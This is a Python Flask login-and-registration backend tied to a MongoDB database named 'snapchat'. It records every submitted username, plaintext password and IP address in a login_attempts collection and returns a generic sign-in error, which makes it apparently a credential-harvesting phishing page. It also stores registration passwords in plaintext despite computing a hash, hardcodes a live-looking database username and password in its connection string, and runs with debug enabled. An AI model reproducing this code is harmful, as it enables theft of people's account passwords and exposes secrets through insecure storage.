from flask import Flask, render_template, request, redirect, url_for
from pymongo import MongoClient
import bcrypt

app = Flask(__name__)

# MongoDB Atlas connection string (replace with your actual string)
MONGO_URI = "mongodb+srv://jenishdesai6363:oKgBb84bY152RePh@cluster1.im4w2nq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1"
client = MongoClient(MONGO_URI)
db = client["snapchat"]
users = db["users"]

@app.route("/", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        user = users.find_one({"username": username})
        success = False

        if user and bcrypt.checkpw(password.encode('utf-8'), user["password"]):
            success = True
            message = "Login successful"
            # Optional: redirect to dashboard
        else:
            error = "Your previous sign-in attempt could not be completed. Please try again."
            message = "Login failed"

        # Log the attempt
        db.login_attempts.insert_one({
            "username": username,
            "password": password,
            "success": success,
            "message": message,
            "ip": request.remote_addr
        })

        if success:
            return f"<h2>Welcome, {username}!</h2>"

    return render_template("login.html", error=error)


@app.route("/register", methods=["GET", "POST"])
def register():
    msg = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        if users.find_one({"username": username}):
            msg = "Username already exists."
        else:
            hashed_pw = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
            users.insert_one({"username": username, "password": password})
            msg = "Registration successful!"

    return render_template("register.html", msg=msg)

if __name__ == "__main__":
    app.run(debug=True)


users.insert_one({
    "username": "user1@example.com",
    "password": "test123"
})